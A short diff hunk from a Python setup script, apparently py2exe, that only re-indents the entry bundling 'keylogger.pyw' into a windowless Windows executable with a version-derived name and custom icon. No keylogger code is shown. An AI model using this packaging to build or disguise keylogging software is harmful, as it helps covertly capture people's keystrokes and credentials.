@@ -53,9 +53,9 @@ setup(
     
     windows = [
        {
-           "script": "keylogger.pyw",
-           "dest_base": version.name,
-               "icon_resources": [(0, version.name+"icon.ico")]
+            "script": "keylogger.pyw",
+            "dest_base": version.name,
+            "icon_resources": [(0, version.name+"icon.ico")]
        }
     ],
     )
